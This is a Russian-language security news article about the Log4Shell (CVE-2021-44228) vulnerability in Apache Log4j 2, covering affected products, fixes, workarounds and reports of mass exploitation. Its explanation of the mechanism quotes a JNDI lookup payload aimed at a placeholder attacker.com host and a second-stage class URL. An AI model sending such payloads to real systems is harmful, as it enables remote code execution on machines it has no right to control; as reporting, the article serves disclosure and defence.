Критическая уязвимость в Apache Log4j 2, затрагивающая многие Java-проекты

В Apache Log4j 2, популярном фреймворке для организации ведения логов в Java-приложениях, выявлена критическая уязвимость, позволяющая выполнить произвольный код при записи в лог специально оформленного значения в формате "{jndi:URL}". Атака может быть проведена на Java-приложения, записывающие в лог значения, полученные из внешних источников, например, при выводе проблемных значений в сообщениях об ошибках. Отмечается, что проблеме подвержены почти все проекты, использующие такие фреймворки, как Apache Struts, Apache Solr, Apache Druid или Apache Flink, включая Steam, Apple iCloud, клиенты и серверы игры Minecraft. Ожидается, что уязвимость может привести к волне массовых атак на корпоративные приложения, повторив историю критических уязвимостей во фреймворке Apache Struts, который по приблизительной оценке применяется в web-приложениях 65% компаний из списка Fortune 100. В том числе уже зафиксированы попытки сканирования сети на предмет уязвимых систем. Проблема усугубляется тем, что уже опубликован рабочий эксплоит, но исправления для стабильных веток на данный момент не сформированы. СVE-идентификатор пока не присвоен. Исправление включено только в тестовую ветку log4j-2.15.0-rc1. В качестве обходного пути блокирования уязвимости рекомендуется выставить параметр Log4j2.formatMsgNoLookups в значение true. Проблема была вызвана тем, что Log4j 2 поддерживает обработку специальных масок "{}" в выводимых в лог строках, в которых могли выполняться запросы JNDI (Java Naming and Directory Interface). Атака сводится к передаче строки с подстановкой "${jndi:ldap://attacker.com/a}", при обработке которой Log4j 2 отправит на сервер attacker.com LDAP-запрос пути к Java-классу. Возвращённый сервером атакующего путь (например, http://second-stage.attacker.com/Exploit.class) будет загружен и выполнен в контексте текущего процесса, что позволяет атакующему добиться выполнения произвольного кода в системе с правами текущего приложения. Дополнение 1: Уязвимости присвоен идентификатор CVE-2021-44228. Дополнение 2: Выявлен способ обхода защиты, добавленной выпуск log4j-2.15.0-rc1. Предложено новое обновление log4j-2.15.0-rc2 с более полной защитой от уязвимости. В коде выделяется изменение, связанное с отсутствием аварийного завершения в случае использования некорректно оформленного JNDI URL. Дополнение 3: Компания Cloudflare зафиксировала проведение массовых автоматизированных атак для захвата управления над системами, использующими уязвимую библиотеку Log4j 2. Дополнение 4: Компания Cybereason предложила проактивный метод борьбы с уязвимостью и опубликовала эксплоит-вакцину Logout4Shell, который через совершение атаки выставляет Java-настройки "log4j2.formatMsgNoLookups = true", "com.sun.jndi.rmi.object.trustURLCodebase = false" и "com.sun.jndi.cosnaming.object.trustURLCodebase = false" для блокирования дальнейшего проявления уязвимости на неподконтрольных системах. Дополнение 5: Уязвимость в том числе затронула продукты GitHub, включая GitHub.com, GitHub Enterprise Cloud и GitHub Enterprise Server. Дополнение 6: Активность атакующих существенно возросла и уязвимость активно эксплуатируется. Например, компания Check Point зафиксировала на своих подставных серверах в пике около 100 попыток эксплуатации в минуту, а компания Sophos сообщила о выявлении нового ботнета для майнинга криптовалюты, сформированного из систем с неисправленной уязвимостью в Log4j 2. Дополнение 7: Фонд Apache опубликовал список своих проектов, которые затрагивает уязвимость в Log4j. Проблеме подвержены: Apache Archiva, Druid, EventMesh, Flink, Fortress, Geode, Hive, JMeter, JSPWiki, OFBiz, Ozone, SkyWalking, Solr, Struts, TrafficControl и Calcite Avatica. Дополнение 8: Выявлен новый вектор атаки, позволяющий обойти добавленную защиту. Дополнение 9: Найдена ещё одна опасная уязвимость в Log4j 2, а также способ атаки через web-браузер на локальные Java-приложения, не принимающие внешние сетевые запросы. Около 8% пакетов в репозитории Maven подвержены уязвимости в Log4j 2 через зависимости, исправления пока внесены только в 13% из этих пакетов. Дополнение 10: Агентство по кибербезопасности и защите инфраструктуры США опубликовало список продуктов, в которых подтверждено проявление уязвимости.